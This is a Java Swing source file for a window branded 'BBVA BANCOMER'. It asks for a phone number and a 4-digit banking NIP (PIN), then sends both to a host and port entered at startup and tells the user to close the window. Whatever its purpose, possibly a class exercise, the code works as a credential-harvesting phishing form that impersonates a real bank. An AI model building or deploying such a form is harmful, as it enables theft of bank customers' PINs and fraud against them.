package cajero;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextField;
import java.util.Scanner;

import cajero.ClienteCajero;

public class Cajero extends JFrame implements ActionListener {

    private JLabel textoTelefono;
    private JTextField cajaTelefono;
    private JLabel textoNip;
    private JTextField cajaNip;
    private JButton boton;
    private String numeroTelefono;
    private String nip;
    private String hostname;
    private int port;

    public Cajero() {
        super();
        this.numeroTelefono = null;
        this.nip = null;
        this.hostname = null;
        this.port = -1;
        configurarVentana();
        inicializarComponentes();
    }

    public Cajero(String hostname, int port) {
        super();
        this.numeroTelefono = null;
        this.nip = null;
        this.hostname = hostname;
        this.port = port;
        configurarVentana();
        inicializarComponentes();
    }

    public Cajero(String numeroTelefono, String nip, String hostname, int port) {
        super();
        this.numeroTelefono = numeroTelefono;
        if(nip.length()!=4)
          throw new IllegalArgumentException("El nip debe ser de 4 digitos");
        this.nip = nip;
        this.hostname = hostname;
        this.port = port;
        configurarVentana();
        inicializarComponentes();
    }

    public String getNumeroTelefono() {
        if(this.numeroTelefono==null)
          throw new NullPointerException("No se ha asignado el numero de telefono");
          return this.numeroTelefono;
    }

    public String getNip() {
        if(this.nip==null)
          throw new NullPointerException("No se ha asignado el nip");
        return this.nip;
    }

    public String getHostname() {
      if(this.hostname==null)
        throw new NullPointerException("No se ha asignado un hostname");
      return this.hostname;
    }

    public int getPort() {
      if(this.port==-1)
        throw new NullPointerException("No se ha asignado un puerto");
      return this.port;
    }

    public void setNumeroTelefono(String numeroTelefono) {
      this.numeroTelefono = numeroTelefono;
    }

    public void setNip(String nip) {
      if(nip.length()!=4)
        throw new IllegalArgumentException("El nip debe contener 4 digitos");
      this.nip = nip;
    }

    public void setHostname(String hostname) {
      this.hostname = hostname;
    }

    public void setPort(int port) {
      this.port = port;
    }

    private void configurarVentana() {
        this.setTitle("BBVA BANCOMER");
        this.setSize(510, 310);
        this.setLocationRelativeTo(null);
        this.setLayout(null);
        this.setResizable(false);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    private void inicializarComponentes() {
        textoTelefono = new JLabel();
        cajaTelefono = new JTextField();
        textoNip = new JLabel();
        cajaNip = new JTextField();
        boton = new JButton();

        textoTelefono.setText("Ingrese su telefono");
        textoTelefono.setBounds(100, 50, 200, 25);
        cajaTelefono.setBounds(300, 50, 100, 25);
        textoNip.setText("Ingrese NIP de 4 dígitos");
        textoNip.setBounds(100, 100, 200, 25);
        cajaNip.setBounds(300, 100, 100, 25);
        boton.setText("Enviar");
        boton.setBounds(150, 200, 200, 30);
        boton.addActionListener(this);

        this.add(textoTelefono);
        this.add(cajaTelefono);
        this.add(textoNip);
        this.add(cajaNip);
        this.add(boton);
    }

    @Override
    public void actionPerformed(ActionEvent e) {
        String numeroTelefono = cajaTelefono.getText();
        String nip = cajaNip.getText();
        if(numeroTelefono.length()==0 || nip.length()==0) {
          JOptionPane.showMessageDialog(this, "No puedes dejar algun campo en blanco.");
          cajaTelefono.setText(null);
          cajaNip.setText(null);
        }
        else if(nip.length()!=4) {
          JOptionPane.showMessageDialog(this, "El NIP debe contener 4 dígitos");
          cajaTelefono.setText(null);
          cajaNip.setText(null);
        }
        else {
          this.numeroTelefono = numeroTelefono;
          this.nip = nip;
          JOptionPane.showMessageDialog(this, "Gracias, ahora puedes cerrar esta ventana :)");
          ClienteCajero cliente = new ClienteCajero(this.hostname,this.port);
          cliente.setNumeroTelefono(numeroTelefono);
          cliente.setNip(nip);
          cliente.sendData();
        }
    }

    public static void main(String[] args) {
      Scanner in = new Scanner(System.in);
      System.out.println("Ingrese el host:");
      String host = in.nextLine();
      System.out.println("Ingrese el puerto:");
      int port = Integer.parseInt(in.nextLine());

      Cajero cajero = new Cajero(host,port);
      cajero.setVisible(true);
    }
}
